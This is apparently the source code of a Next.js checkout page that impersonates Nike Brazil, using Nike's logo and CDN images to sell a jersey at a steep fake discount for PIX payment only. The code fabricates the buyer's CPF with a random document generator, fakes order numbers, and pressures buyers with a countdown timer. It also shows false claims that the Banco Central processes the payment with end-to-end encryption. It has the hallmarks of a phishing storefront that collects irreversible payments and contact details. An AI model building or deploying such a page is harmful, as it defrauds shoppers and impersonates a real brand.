"use client";

import { useState, useEffect, useRef, useCallback } from "react";
import { useRouter } from "next/navigation";
import Image from "next/image";
import Link from "next/link";
import QRCode from "react-qr-code";
import { ChevronLeft, Copy, Check, RefreshCw, Clock, CreditCard } from "lucide-react";
import { useCheckout } from "../context/CheckoutContext";
import { gw, randomDoc } from "../lib/gw";

const SESSION_MS   = 8 * 60 * 1000;
const POLL_MS      = 5_000;
const AMOUNT       = 69.90;

function formatPrice(v: number) {
  return `R$ ${v.toLocaleString("pt-BR", { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;
}

function formatCountdown(ms: number) {
  const s = Math.max(0, Math.floor(ms / 1000));
  return `${Math.floor(s / 60).toString().padStart(2, "0")}:${(s % 60).toString().padStart(2, "0")}`;
}

type Stage = "idle" | "generating" | "waiting" | "completed" | "expired" | "error";

/* ── save / read state from URL ── */
function readUrlState(): { txId: string; pix: string } | null {
  if (typeof window === "undefined") return null;
  const p = new URLSearchParams(window.location.search);
  const txId = p.get("txId");
  const pix  = p.get("pix");
  return txId && pix ? { txId, pix } : null;
}

function saveUrlState(txId: string, pix: string) {
  const p = new URLSearchParams(window.location.search);
  // preserve any existing UTM params, just add/overwrite txId & pix
  p.set("txId", txId);
  p.set("pix",  pix);
  history.replaceState(null, "", `?${p.toString()}`);
}

function clearUrlState() {
  const p = new URLSearchParams(window.location.search);
  p.delete("txId");
  p.delete("pix");
  const qs = p.toString();
  history.replaceState(null, "", qs ? `?${qs}` : window.location.pathname);
}

export default function PagamentoPage() {
  const router   = useRouter();
  const checkout = useCheckout();

  const nomeProduto   = checkout.nomeProduto   || "Camisa Brasil Jordan II 2026/27 Jogador Masculina";
  const corLabel      = checkout.corLabel      || "Azul/Preto";
  const imagemProduto = checkout.imagemProduto || "https://imgnike-a.akamaihd.net/1920x1920/09761915A3.jpg";
  const tamanho       = checkout.tamanho       || "—";

  const [stage,         setStage]         = useState<Stage>("idle");
  const [pixCode,       setPixCode]       = useState("");
  const [transactionId, setTransactionId] = useState("");
  const [copied,        setCopied]        = useState(false);
  const [errorMsg,      setErrorMsg]      = useState("");
  const [msLeft,        setMsLeft]        = useState(SESSION_MS);

  const pollRef   = useRef<ReturnType<typeof setInterval> | null>(null);
  const expRef    = useRef<ReturnType<typeof setTimeout>  | null>(null);
  const tickRef   = useRef<ReturnType<typeof setInterval> | null>(null);
  const startedAt = useRef(0);
  const didInit   = useRef(false);

  const stopPolling = useCallback(() => {
    if (pollRef.current) clearInterval(pollRef.current);
    if (expRef.current)  clearTimeout(expRef.current);
    if (tickRef.current) clearInterval(tickRef.current);
  }, []);

  useEffect(() => () => stopPolling(), [stopPolling]);

  const startPolling = useCallback((txId: string) => {
    pollRef.current = setInterval(async () => {
      try {
        const res = await fetch(`${gw()}?transactionId=${encodeURIComponent(txId)}`, {
          signal: AbortSignal.timeout(10_000),
        });
        if (!res.ok) return;
        const { status } = await res.json();
        if (status === "COMPLETED") {
          stopPolling();
          clearUrlState();
          const pedido = "NKE" + Date.now().toString().slice(-8);
          router.push(`/sucesso?pedido=${pedido}`);
        }
      } catch { /* next cycle */ }
    }, POLL_MS);
  }, [stopPolling, router]);

  const generatePix = useCallback(async () => {
    setStage("generating");
    setErrorMsg("");

    // Capture UTMs (excluding our own state params)
    const raw = new URLSearchParams(window.location.search);
    raw.delete("txId");
    raw.delete("pix");
    const utm = raw.toString();

    const AMOUNT_CENTS = 6990;

    try {
      const res = await fetch(gw(), {
        method:  "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          amount: AMOUNT_CENTS,
          customer: {
            name:     checkout.nome,
            document: randomDoc(),
            email:    checkout.email,
            phone:    String(checkout.telefone ?? "").replace(/\D/g, ""),
          },
          item: {
            title:    "Camisa Brasil Jordan II 2026/27",
            price:    AMOUNT_CENTS,
            quantity: 1,
          },
          paymentMethod: "PIX",
          ...(utm ? { utm } : {}),
        }),
        signal: AbortSignal.timeout(15_000),
      });

      const data = await res.json();
      if (!res.ok || !data.pixCode || !data.transactionId)
        throw new Error(data.error ?? "Erro ao gerar cobrança");

      setPixCode(data.pixCode);
      setTransactionId(data.transactionId);
      saveUrlState(data.transactionId, data.pixCode);
      setStage("waiting");
      startPolling(data.transactionId);
    } catch (err) {
      setErrorMsg(err instanceof Error ? err.message : "Erro desconhecido");
      setStage("error");
    }
  }, [checkout, startPolling]);

  /* ── on mount: start urgency timer immediately, restore URL state if any ── */
  useEffect(() => {
    if (didInit.current) return;
    didInit.current = true;

    startedAt.current = Date.now();

    tickRef.current = setInterval(() => {
      const left = SESSION_MS - (Date.now() - startedAt.current);
      setMsLeft(Math.max(0, left));
    }, 1000);

    expRef.current = setTimeout(() => {
      stopPolling();
      clearUrlState();
      setStage("expired");
    }, SESSION_MS);

    const saved = readUrlState();
    if (saved) {
      setPixCode(saved.pix);
      setTransactionId(saved.txId);
      setStage("waiting");
      startPolling(saved.txId);
    }
    // else: stay on "idle" — user clicks to generate
  }, [stopPolling, startPolling]);

  const copyCode = async () => {
    await navigator.clipboard.writeText(pixCode).catch(() => {});
    setCopied(true);
    setTimeout(() => setCopied(false), 2500);
  };

  const reset = () => {
    stopPolling();
    clearUrlState();
    setPixCode("");
    setTransactionId("");
    generatePix();
  };

  return (
    <div className="min-h-screen bg-white text-[#111] font-sans pb-32">
      {/* Header */}
      <header className="flex items-center justify-center px-6 py-4 relative border-b border-gray-200">
        <Link href="/identificacao" className="absolute left-6">
          <ChevronLeft className="w-6 h-6" />
        </Link>
        <Image
          src="https://static.nike.com.br/v11-288-0/images/brands/logo.svg"
          alt="Nike"
          width={48}
          height={17}
          className="w-12 h-auto"
          priority
        />
      </header>

      {/* Progress Bar */}
      <div className="flex text-xs font-medium bg-[#e5e5e5] h-12 border-b border-gray-200">
        <div
          className="flex-[1.2] flex items-center justify-center text-gray-500"
          style={{ clipPath: "polygon(0 0, calc(100% - 15px) 0, 100% 50%, calc(100% - 15px) 100%, 0 100%)" }}
        >
          <span className="w-4 h-4 bg-gray-400 text-white rounded-full flex items-center justify-center mr-2 text-[10px]">1</span>
          Carrinho
        </div>
        <div
          className="flex-1 flex items-center justify-center text-gray-500 pl-2"
          style={{ clipPath: "polygon(0 0, calc(100% - 15px) 0, 100% 50%, calc(100% - 15px) 100%, 0 100%)" }}
        >
          <span className="w-4 h-4 bg-gray-400 text-white rounded-full flex items-center justify-center mr-2 text-[10px]">2</span>
          Identificação
        </div>
        <div className="flex-1 bg-white flex items-center justify-center pl-2 relative z-10">
          <span className="w-4 h-4 bg-black text-white rounded-full flex items-center justify-center mr-2 text-[10px]">3</span>
          Pagamento
        </div>
      </div>

      <main className="px-6 py-6 max-w-xl mx-auto space-y-6">

        <h1 className="text-[22px] font-medium">Pagamento</h1>

        {/* Oferta reservada */}
        <div className="rounded-lg border overflow-hidden" style={{ borderColor: msLeft <= 120_000 ? "#fca5a5" : "#d1d5db" }}>
          {/* Progress bar — shrinks as time runs out */}
          <div className="h-[3px] bg-gray-100">
            <div
              className="h-full transition-all duration-1000 ease-linear"
              style={{
                width: `${(msLeft / SESSION_MS) * 100}%`,
                backgroundColor: msLeft <= 120_000 ? "#dc2626" : "#007a33",
              }}
            />
          </div>

          <div className="px-4 py-4 bg-white">
            <div className="flex items-center justify-between mb-3">
              <p className="text-[11px] font-bold uppercase tracking-[0.12em] text-gray-700">
                Oferta reservada
              </p>
              <div
                className="flex items-center gap-1.5 text-[12px] font-semibold tabular-nums"
                style={{ color: msLeft <= 120_000 ? "#dc2626" : "#374151" }}
              >
                <Clock className="w-3.5 h-3.5" />
                <span>{formatCountdown(msLeft)}</span>
              </div>
            </div>

            <div className="flex items-baseline gap-2 mb-1">
              <span className="text-[13px] text-gray-400 line-through">{formatPrice(449.90)}</span>
              <span className="text-[22px] font-bold text-[#007a33]">{formatPrice(AMOUNT)}</span>
            </div>
            <p className="text-[12px] text-[#007a33]">
              Você economiza {formatPrice(380.00)} com o cupom da campanha.
            </p>

            {msLeft <= 120_000 && (
              <p className="mt-2.5 pt-2.5 border-t border-red-100 text-[11px] font-medium text-red-600">
                Finalize o pagamento agora para garantir este preço.
              </p>
            )}
          </div>
        </div>

        {/* Resumo do pedido */}
        <div className="border border-gray-200 rounded-lg overflow-hidden">
          <div className="px-4 py-3 bg-[#f5f5f5] border-b border-gray-200">
            <p className="text-[12px] font-medium text-gray-600">Resumo do pedido</p>
          </div>
          <div className="px-4 py-4 flex gap-3">
            <div className="relative w-14 h-14 flex-shrink-0 bg-[#f5f5f5] rounded overflow-hidden">
              <Image
                src={imagemProduto}
                alt={nomeProduto}
                fill
                className="object-cover"
                referrerPolicy="no-referrer"
              />
            </div>
            <div className="flex-1">
              <p className="text-[13px] font-medium leading-snug">{nomeProduto}</p>
              <p className="text-[11px] text-gray-500 mt-0.5">{corLabel} · {tamanho} · Qtd: 1</p>
            </div>
            <p className="text-[14px] font-medium">{formatPrice(AMOUNT)}</p>
          </div>
          <div className="px-4 pb-4 space-y-1.5 text-[13px]">
            <div className="flex justify-between">
              <span className="text-gray-500">Frete</span>
              <span className="text-[#007a33] font-medium">Grátis</span>
            </div>
            <div className="flex justify-between font-medium text-[14px] pt-1.5 border-t border-gray-100">
              <span>Total</span>
              <span>{formatPrice(AMOUNT)}</span>
            </div>
          </div>
        </div>

        {/* PIX section */}
        <div className="border border-gray-200 rounded-lg overflow-hidden">
          <div className="px-4 py-3 bg-[#f5f5f5] border-b border-gray-200 flex items-center gap-2">
            {/* PIX logo */}
            <svg viewBox="0 0 512 512" className="w-4 h-4 flex-shrink-0">
              <path d="M112.57 391.19c20.43 0 39.64-7.95 54.1-22.41l88.89-88.89c6.64-6.41 17.62-6.41 24.07 0l89.2 89.2c14.46 14.46 33.67 22.41 54.1 22.41h17.06L327.62 503.86c-41.57 41.57-109.01 41.57-150.58 0L64.64 391.19h47.93z" fill="#32BCAD"/>
              <path d="M399.43 120.81c-20.43 0-39.64 7.95-54.1 22.41l-89.2 89.2c-6.45 6.45-17.63 6.45-24.07 0l-88.89-88.9c-14.46-14.46-33.67-22.41-54.1-22.41H64.64L177.04 8.14c41.57-41.57 109.01-41.57 150.58 0l112.37 112.37-40.56.3z" fill="#32BCAD"/>
              <path d="M503.07 215.83L439.4 152.16h-39.97c-14.38 0-28.16 5.74-38.3 15.88l-89.2 89.2c-18.04 18.04-47.42 18.04-65.46 0l-88.89-88.9c-10.14-10.14-23.92-15.88-38.3-15.88H8.93L72.6 359.81h7.26c14.38 0 28.16-5.74 38.3-15.88l88.89-88.89c8.86-8.86 20.73-13.73 33.23-13.73s24.37 4.87 33.23 13.73l89.2 89.2c10.14 10.14 23.92 15.88 38.3 15.88h36.39l72.67-72.67a106.49 106.49 0 0 0 0-150.62z" fill="#32BCAD"/>
            </svg>
            <p className="text-[12px] font-medium text-gray-700">Pagar com PIX</p>
          </div>

          <div className="px-4 py-6">

            {/* IDLE — aguardando clique */}
            {stage === "idle" && (
              <div className="flex flex-col items-center gap-4 py-2">
                <p className="text-[13px] text-gray-500 text-center leading-relaxed">
                  Clique abaixo para gerar seu QR Code e finalizar o pagamento.
                </p>
                <button
                  onClick={generatePix}
                  className="w-full bg-black text-white rounded-full py-4 font-medium text-[15px] hover:bg-gray-800 active:scale-[0.98] transition-all"
                >
                  Gerar QR Code PIX
                </button>
              </div>
            )}

            {/* GENERATING */}
            {stage === "generating" && (
              <div className="flex flex-col items-center gap-4 py-6">
                <RefreshCw className="w-8 h-8 text-gray-300 animate-spin" />
                <p className="text-[14px] text-gray-500">Gerando cobrança PIX...</p>
              </div>
            )}

            {/* WAITING */}
            {stage === "waiting" && pixCode && (
              <div className="flex flex-col items-center gap-5">

                {/* Countdown */}
                <div className="flex items-center gap-1.5 text-[12px] text-gray-500">
                  <Clock className="w-3.5 h-3.5" />
                  <span>
                    Expira em{" "}
                    <span className="font-semibold tabular-nums text-[#111]">
                      {formatCountdown(msLeft)}
                    </span>
                  </span>
                </div>

                {/* QR Code */}
                <div className="rounded-xl border border-gray-200 bg-white p-5 shadow-sm">
                  <QRCode value={pixCode} size={196} />
                </div>

                <p className="text-[13px] text-gray-500 text-center leading-relaxed">
                  Escaneie o QR Code no app do seu banco<br />ou copie o código PIX abaixo
                </p>

                {/* Copy code */}
                <div className="w-full rounded-lg border border-gray-200 bg-[#f9f9f9] px-3 py-3 flex items-center gap-2">
                  <p className="flex-1 text-[11px] font-mono text-gray-400 truncate select-all">
                    {pixCode}
                  </p>
                  <button
                    onClick={copyCode}
                    className="flex-shrink-0 flex items-center gap-1.5 rounded-full bg-black px-3 py-1.5 text-[11px] font-medium text-white transition-colors hover:bg-gray-800 active:scale-95"
                  >
                    {copied
                      ? <><Check className="w-3 h-3" />Copiado</>
                      : <><Copy className="w-3 h-3" />Copiar</>}
                  </button>
                </div>

                {/* Polling indicator */}
                <div className="flex items-center gap-2 text-[11px] text-gray-400">
                  <span className="h-2 w-2 rounded-full bg-[#007a33] animate-pulse inline-block" />
                  Aguardando confirmação do pagamento...
                </div>

              </div>
            )}

            {/* ERROR */}
            {stage === "error" && (
              <div className="flex flex-col items-center gap-4 text-center py-2">
                <p className="text-[14px] text-red-500">{errorMsg || "Erro ao gerar cobrança PIX."}</p>
                <button
                  onClick={reset}
                  className="w-full bg-black text-white rounded-full py-4 font-medium text-[15px] hover:bg-gray-800 transition-colors"
                >
                  Tentar novamente
                </button>
              </div>
            )}

            {/* EXPIRED */}
            {stage === "expired" && (
              <div className="flex flex-col items-center gap-4 text-center py-2">
                <Clock className="w-8 h-8 text-gray-300" />
                <p className="text-[14px] text-gray-500">O tempo de pagamento expirou.</p>
                <button
                  onClick={reset}
                  className="w-full bg-black text-white rounded-full py-4 font-medium text-[15px] hover:bg-gray-800 transition-colors"
                >
                  Gerar novo QR Code
                </button>
              </div>
            )}

            {/* COMPLETED */}
            {stage === "completed" && (
              <div className="flex flex-col items-center gap-5 text-center py-2">
                <div className="flex h-16 w-16 items-center justify-center rounded-full bg-[#f0faf5]">
                  <svg className="w-8 h-8 text-[#007a33]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth={2.5} strokeLinecap="round" strokeLinejoin="round">
                    <path d="M20 6 9 17l-5-5" />
                  </svg>
                </div>
                <div>
                  <p className="text-[18px] font-medium text-[#007a33]">Pagamento confirmado!</p>
                  <p className="text-[13px] text-gray-500 mt-1">
                    Seu pedido foi recebido. Em breve você receberá a confirmação por email.
                  </p>
                </div>
                <div className="w-full rounded-lg border border-[#b2dfcb] bg-[#f0faf5] px-4 py-3.5 text-left">
                  <p className="text-[11px] font-bold uppercase tracking-[0.14em] text-[#007a33] mb-1">
                    Pedido realizado
                  </p>
                  <p className="text-[13px] text-[#007a33]">
                    {nomeProduto} · {formatPrice(AMOUNT)}
                  </p>
                  {checkout.email && (
                    <p className="text-[12px] text-gray-500 mt-1">
                      Confirmação enviada para {checkout.email}
                    </p>
                  )}
                </div>
              </div>
            )}

          </div>
        </div>

        {/* Cartão de Crédito — desabilitado */}
        <div className="border border-gray-200 rounded-lg overflow-hidden opacity-50 pointer-events-none select-none">
          <div className="px-4 py-3 bg-[#f5f5f5] border-b border-gray-200 flex items-center justify-between">
            <div className="flex items-center gap-2">
              <CreditCard className="w-4 h-4 text-gray-400" />
              <p className="text-[12px] font-medium text-gray-600">Cartão de Crédito</p>
            </div>
            <span className="text-[10px] font-semibold rounded-full border border-gray-300 bg-white px-2.5 py-1 text-gray-400 uppercase tracking-[0.08em]">
              Indisponível para essa oferta
            </span>
          </div>
          <div className="px-4 py-5 space-y-3">
            <div className="h-10 rounded-lg border border-gray-200 bg-gray-50" />
            <div className="grid grid-cols-2 gap-3">
              <div className="h-10 rounded-lg border border-gray-200 bg-gray-50" />
              <div className="h-10 rounded-lg border border-gray-200 bg-gray-50" />
            </div>
            <div className="h-10 rounded-lg border border-gray-200 bg-gray-50" />
          </div>
        </div>

        {/* Security note */}
        {stage === "waiting" && (
          <p className="text-center text-[11px] text-gray-400 leading-relaxed pb-2">
            Pagamento processado com segurança via PIX pelo Banco Central do Brasil.
            Seus dados estão protegidos com criptografia de ponta a ponta.
          </p>
        )}

      </main>
    </div>
  );
}
